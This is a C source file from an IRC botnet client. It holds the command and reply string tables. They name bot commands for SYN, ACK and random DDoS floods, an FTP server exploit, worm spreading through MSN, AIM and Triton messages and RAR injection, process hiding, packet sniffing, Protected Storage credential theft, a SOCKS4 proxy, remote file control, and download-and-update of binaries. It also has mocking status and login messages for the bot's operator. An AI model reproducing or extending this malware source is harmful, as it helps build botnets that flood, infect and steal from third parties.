const char cmd_all[]			= "all";

const char cmd_login_1[]		= "login";
const char cmd_login_2[]		= "l";

const char cmd_threads_1[]		= "threads";
const char cmd_threads_2[]		= "t";
const char cmd_threads_sub[]	= "sub";
const char cmd_threads_kill_1[]	= "kill";
const char cmd_threads_kill_2[]	= "k";

const char cmd_logout_1[]		= "logout";
const char cmd_logout_2[]		= "lo";

const char cmd_who[]			= "who";
const char cmd_rarspread_1[]    = "inject";
const char cmd_remove_1[]		= "remove";
const char cmd_remove_2[]		= "bye";
const char cmd_uptime_1[]		= "uptime";
const char cmd_uptime_2[]		= "up";


#ifndef NO_BOTVERSION
const char cmd_version_1[]		= "version";
const char cmd_version_2[]		= "v";
#endif

#ifndef NO_DDOS
const char cmd_ddos_syn[]		= "ddos.syn";
const char cmd_ddos_ack[]		= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";
#endif

#ifndef NO_SUPERSYN
const char cmd_ddos_supersyn[]	= "ddos.supersyn";
#endif

const char cmd_eftpd_1[]	    = "exploitftpd";
const char cmd_eftpd_2[]	    = "eftpd";


#ifndef NO_PROCESS
const char cmd_process_1[]		= "process";
const char cmd_process_2[]		= "ps";
const char cmd_process_list[]	= "list";
const char cmd_process_kill[]	= "kill";
const char cmd_process_del[]	= "del";
const char cmd_process_hide[]	= "hide";
const char cmd_process_create[]	= "create";
#endif

const char cmd_nickupd_1[]		= "nickupdate";
const char cmd_nickupd_2[]		= "nu";
const char cmd_rndnick_1[]		= "randnick";
const char cmd_rndnick_2[]		= "rand";

#ifndef NO_SOCK4SERV
const char cmd_socks4_1[]		= "socks4";
const char cmd_socks4_2[]		= "socks4.stop";
#endif

const char cmd_imspread_1[]		= "msn.msg";
const char cmd_imspread_2[]		= "msn.stop";
const char cmd_imspread_3[]     = "msn.add";
const char cmd_aimspread_1[]    = "aim.msg";
const char cmd_aimspread_2[]    = "aim.stop";
const char cmd_timspread_1[]    = "triton.msg";
const char cmd_timspread_2[]    = "triton.stop";
const char cmd_seed[]			= "utorrent.seed";
const char cmd_visit[]			= "visit";

#ifndef NO_NETSTATP
const char cmd_netstatp_1[]		= "netstatp";
const char cmd_netstatp_2[]		= "nsp";
#endif

#ifndef NO_SNIFFER
const char cmd_sniffer_1[]		= "sniffer";
const char cmd_sniffer_2[]		= "sniff";
#endif

#ifndef NO_IESTART
const char cmd_iestart_1[] 		= "iestart";
const char cmd_iestart_2[] 		= "ies";
#endif

const char cmd_join_1[]			= "join";
const char cmd_join_2[]			= "j";

const char cmd_part_1[]			= "part";
const char cmd_part_2[]			= "p";

const char cmd_raw_1[]			= "raw";
const char cmd_raw_2[]			= "r";

const char cmd_prefix_1[]		= "prefix";
const char cmd_prefix_2[]		= "pr";

const char cmd_dns_1[]			= "resolve";
const char cmd_dns_2[]			= "dns";

#ifndef NO_FLUSHARP
const char cmd_flusharp_1[]		= "flusharp";
const char cmd_flusharp_2[]		= "farp";
#endif

#ifndef NO_FLUSHDNS
const char cmd_flushdns_1[]		= "flushdns";
const char cmd_flushdns_2[]		= "fdns";
#endif

#ifndef NO_PSTORE
const char cmd_pstore_1[]		= "pstore";
const char cmd_pstore_2[]		= "pst";
#endif

#ifndef NO_SYSINFO
const char cmd_sysinfo_1[]		= "sysinfo";
const char cmd_sysinfo_2[]		= "si";
#endif

#ifndef NO_NETINFO
const char cmd_netinfo_1[]		= "netinfo";
const char cmd_netinfo_2[]		= "ni";
#endif

#ifndef NO_DRIVEINFO
const char cmd_drvinfo_1[]		= "driveinfo";
const char cmd_drvinfo_2[]		= "di";
const char cmd_drvinfo_total_1[]= "total";
const char cmd_drvinfo_total_2[]= "t";
const char cmd_drvinfo_mb[]		= "mb";
const char cmd_drvinfo_gb[]		= "gb";
#endif

#ifndef NO_MIRCCMD
const char cmd_mirccmd_1[] 		= "mirccmd";
const char cmd_mirccmd_2[] 		= "mirc";
#endif

const char cmd_system_1[] 		= "system";
const char cmd_system_2[] 		= "sys";


#ifndef NO_FILECTRL
const char cmd_filectrl_1[]		= "file";
const char cmd_filectrl_2[]		= "f";
const char cmd_filectrl_read_1[]= "type";
const char cmd_filectrl_read_2[]= "cat";
const char cmd_filectrl_exst_1[]= "exists";
const char cmd_filectrl_exst_2[]= "ex";
const char cmd_filectrl_del_1[]	= "del";
const char cmd_filectrl_del_2[]	= "rm";
const char cmd_filectrl_rmdir[]	= "rmdir";
const char cmd_filectrl_move_1[]= "move";
const char cmd_filectrl_move_2[]= "mv";
const char cmd_filectrl_copy_1[]= "copy";
const char cmd_filectrl_copy_2[]= "cp";
const char cmd_filectrl_att_1[]	= "attrib";
const char cmd_filectrl_att_2[]	= "at";
const char cmd_filectrl_open_1[]= "open";
const char cmd_filectrl_open_2[]= "op";
#endif

#ifndef NO_DOWNLOAD
const char cmd_download_1[]		= "down";
const char cmd_download_2[]		= "wget";
const char cmd_update_1[]		= "update";
const char cmd_update_2[]		= "upd";
#endif

#ifndef NO_IFELSE
const char cmd_if_1[]			= "if";
const char cmd_if_2[]			= "i";
const char cmd_else_1[]			= "else";
const char cmd_else_2[]			= "e";
const char cmd_ifelse_nick_1[]	= "nick";
const char cmd_ifelse_nick_2[]	= "n";
const char cmd_ifelse_host_1[]	= "host";
const char cmd_ifelse_host_2[]	= "h";
const char cmd_ifelse_id[]		= "id";
const char cmd_ifelse_uptime_1[]= "uptime";
const char cmd_ifelse_uptime_2[]= "up";
const char cmd_ifelse_priv_1[]	= "private";
const char cmd_ifelse_priv_2[]	= "p";
const char cmd_ifelse_status_1[]= "status";
const char cmd_ifelse_status_2[]= "s";
#endif


char str_auth_good[]	= "%s Oh hai, you're now logged in :]";
char str_auth_full[]	= "%s Login failed, too many logged in users.";
char str_spy_privmsg[]	= "%s Possible spy: %s!%s@%s (Sent PM: \"%s\")";
char str_auth_bad[]		= "%s Failed authentication by: %s!%s@%s (Pass Tried: %s)";
char str_logout[]		= "%s User %s logged out.";
char str_sl_logout[]	= "%s Slot <%i> logged out.";
char str_msn_msg[]	= "12-7=13[4MSN13]7=12- Message sent to: %d Contacts.";
char str_sl_no_logout[]	= "%s No user logged in at slot: <%i>";
char str_sl_in_logout[]	= "%s Invalid login slot number: <%i>";
char str_thread_stop[]	= "%s Stopped: <%d> thread(s).";
char str_thread_ac[]	= "%s No active threads found.";
char str_thread_kill[]	= "%s Killed thread: <%s>";
char str_thread_fkill[]	= "%s Failed to kill thread: <%s>";
char str_thread_alr[]	= "%s %s already running at thread number: <%d>.";
char str_thread_fail[]	= "%s Failed to start %s, error: <%d>.";
char str_status[]		= "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";
char str_installed[]	= "%s Bot installed on: %s.";
char str_kick_msg[]		= "y u kick me %s ;_;";
char str_auth_ali[]		= "%s You are already logged in bitch.";
char str_quit_rem[]		= "Remove command received from: %s!%s@%s";
char str_quit_upd[]		= "Brb, Updating to new Binary.";
char str_noadvapi[]		= "%s Advapi.dll is not loaded.";
char str_nopstore[]		= "%s PStore.dll is not loaded.";
char str_main_thread[]	= "%s Main bot thread.";
char str_bad_format[]	= "%s Missing parameter(s).";
char str_exip_resolve[] = "Couldn't resolve host";

char ddos_title[]	= "12-7=13[4DDoS13]7=12-";
char imspread_title[]   = "12-7=13[4MSN13]7=12-";
char aimspread_title[]  = "12-7=13[4AiM13]7=12-";
char timspread_title[]  = "12-7=13[4TRiTON13]7=12-";
char visit_title[]	= "12-7=13[4ViSiT13]7=12-";
char seed_title[] = "12-7=13[4SEED13]7=12-";
char main_title[]		= "12-7=13[4MAiN13]7=12-";
char threads_title[]	= "12-7=13[4THREADS13]7=12-";
char process_title[]	= "12-7=13[4PROC13]7=12-";
char irc_title[]		= "12-7=13[4iRC13]7=12-";
char netinfo_title[]	= "12-7=13[4NETiNFO13]7=12-";
char sysinfo_title[]	= "12-7=13[4SYSiNFO13]7=12-";
char drives_title[]		= "12-7=13[4DRiVES13]7=12-";
char mirc_title[]		= "12-7=13[4MiRC13]7=12-";
char file_title[]		= "12-7=13[4FiLE13]7=12-";
char download_title[]	= "12-7=13[4DOWNLOAD13]7=12-";
char update_title[]		= "12-7=13[4UPDATE13]7=12-";
char logic_title[]		= "12-7=13[4LOGiC13]7=12-";
char reg_title[]		= "12-7=13[4REG13]7=12-";
char pstore_title[]		= "12-7=13[4PSTORE13]7=12-";
char netstatp_title[]	= "12-7=13[4NETSTAT13]7=12-";
char sniffer_title[]	= "12-7=13[4SNiFFER13]7=12-";
char tcp_title[]		= "12-7=13[4TCP13]7=12-";
char udp_title[]		= "12-7=13[4UDP13]7=12-";
char sock4_title[]		= "12-7=13[4SOCKS413]7=12-";
char warn_title[]		= "12-7=13[4WARN13]7=12-";
char ftp_title[]		= "-=[FTPD]=-";
